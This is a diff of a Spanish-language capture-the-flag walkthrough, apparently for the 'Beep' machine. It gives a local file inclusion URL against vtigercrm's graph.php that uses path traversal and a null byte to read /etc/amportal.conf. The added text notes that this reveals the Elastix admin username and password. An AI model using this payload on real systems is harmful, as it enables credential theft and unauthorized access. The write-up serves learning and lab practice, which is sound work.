@@ -78,8 +78,10 @@ El código que introduciremos vía web es este:
 `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
 
 Nos aparecerá está página, hacemos **control + u** para ver mejor el texto.
-
 ![LF1.jpg]({{site.baseurl}}/images/Beep/LF1.jpg)
+
+En este texto, encontramos el usuario **admin** y su **password**, con la podremos entrar en en **panel de administrador de Elaxtix**
+
 
 
 
